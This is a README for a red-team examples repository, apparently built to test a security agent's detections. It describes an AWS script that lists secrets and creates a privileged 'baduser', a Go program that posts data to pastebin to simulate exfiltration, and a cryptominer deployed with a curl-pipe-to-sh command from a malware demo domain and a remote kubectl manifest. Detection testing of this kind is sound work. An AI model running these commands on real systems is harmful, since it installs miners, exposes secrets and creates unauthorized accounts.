# Red Team Examples
Red team examples and sample code.  
  
### About Red Teaming
The purpose of red team testing is to validate the state of an environment by simulating an attack. Red team tests are performed by a group of security professionals.  
  
Red teams are responsible for testing the organization's detection and response capabilities by attempting to gain access to systems or data covertly.   
  - The team will carry out different attacks, with the flexibility to use different techniques (phishing/spearphishing, exploiting vulnerabilities in software, social engineering, etc.).   
  - The end goal of the red team is to get as much access/data as possible without being detected.   
  - At the end of the engagement, the red team delivers a report of actions taken by their team.  
  - The red team and blue team (which is the internal security team that is responsible for defending against the red team/attackers) compare notes on what was/wasn’t detected, allowing the security team to understand and correct gaps in coverage/detections.  
    
These examples are simple to run but display behaviours that will test the validity of security systems.   
  
### 1. AWS Account Exploit  
  
This script performs AWS CLI commands to simulate offensive security actions:   
  - lists EC2 instances, security groups, secrets for each region. 
  - creates a new AWS IAM user eg. 'baduser' with power user privileges.    
  - using 'baduser', creates an S3 bucket, and puts a file into it.  
  - cleans up: deletes the bucket, deletes 'baduser'.
  - accepts an optional argument for the username that gets created, otherwise defaults to `baduser`. 
  
##### Prerequisites
  - AWS CLI with profile set. 

##### Usage
Arguments: newusername awsprofile. 
  
```bash 
cd aws_account_exploit
sh ./aws-lateral-movement.sh baduser default
```
  
### 2. Exfiltration Simulation
  
This example pulls data down some random endpoints and then attempts to post it to pastebin. The script does not do anything inherently malicious but is the type of activity indicating data exfiltration.  
  
##### Prerequisites
  - AWS EC2 Linux with Lacework Agent
  - Golang 
  
##### Usage
```bash
apt install golang
  
  
cd GoExfil
go build
go run BasicExfil.go
```
  
### 3. Cryptominer
  
This example installs and runs XMRig, which is a cryptominer. The installation is not malware and does not propagate. 
  
The Crypto Mining script should be run on a standalone EC2 Instance or Kubernetes deployment with Lacework installed. The exploit will only execute in interactive mode, so once the script is terminated, the exploit will be terminated. It’s recommended to run for at least 1 hour to ensure all steps in the exploit are executed.  
  
##### Prerequisites
  - AWS EC2 Linux with Lacework Agent.  
  - (alternative) AWS K8s Cluster with Lacework Agent.  
  
##### Linux VM Deployment
```bash
curl http://lwmalwaredemo.com/install-demo-1.sh -o install-demo-1.sh; sh install-demo-1.sh;
```
  
##### Kubernetes Deployment
Deploys a crypto miner malware example for testing the Lacework agent. 
  
Run the following command to deploy the example.  
```bash
kubectl apply -f https://raw.githubusercontent.com/lacework-dev/scripts/main/k8s-crypto-miner.yaml
```
  
Run the following command to delete the example.  

```bash
kubectl delete -f https://raw.githubusercontent.com/lacework-dev/scripts/main/k8s-crypto-miner.yaml
```
Here is the script:  
https://github.com/lacework-dev/scripts/blob/main/k8s-crypto-miner.yaml
  


